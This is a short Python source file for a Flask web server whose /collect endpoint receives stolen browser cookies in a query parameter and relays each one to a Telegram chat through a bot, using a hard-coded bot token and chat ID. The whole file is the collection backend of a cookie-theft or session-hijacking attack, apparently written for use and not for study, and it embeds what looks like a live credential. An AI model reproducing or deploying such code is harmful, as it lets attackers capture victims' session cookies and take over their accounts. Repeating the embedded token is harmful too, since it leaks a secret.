import telebot
from flask import Flask, request

BOT_TOKEN = "8726750443:AAEyVRTAaYLaKIn7vr0TT1gDuo8e8xjiGto"
CHAT_ID = "5560619845"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route("/")
def index():
    return "ok"

@app.route("/collect")
def collect():
    cookie = request.args.get("c", "")
    if cookie:
        bot.send_message(CHAT_ID, f"Cookie:\n\n{cookie}")
        return "sent"
    return "no cookie"

if __name__ == "__main__":
    import os, threading
    PORT = int(os.environ.get("PORT", 10000))
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host="0.0.0.0", port=PORT)